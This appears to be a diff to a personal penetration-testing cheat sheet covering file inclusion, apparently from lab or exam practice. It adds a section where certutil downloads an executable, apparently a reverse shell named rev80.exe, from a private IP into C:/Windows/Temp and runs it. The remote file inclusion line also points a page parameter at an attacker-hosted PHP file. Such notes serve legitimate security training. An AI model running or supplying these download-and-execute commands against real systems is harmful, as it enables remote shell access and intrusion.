@@ -1,6 +1,6 @@
 [Local File Inclusion](#local-file-inclusion)
 [Remote File Inclusion](#remote-file-inclusion)
-
+[Java Code Execution](#java-code-execution)
 
 # Local File Inclusion
 - Click stuff to find out if we can find this ?file=, ?page=
@@ -20,3 +20,11 @@
 
 # Remote File Inclusion
 - ?page=http://192.168.45.208/somefile.php
+
+
+
+# Java Code Execution (C:/Windows/Temp/)
+```bash
+certutil -urlcache -f http://192.168.45.176/rev80.exe C:/Windows/Temp/rev80.exe
+C:/Windows/Temp/rev80.exe
+```
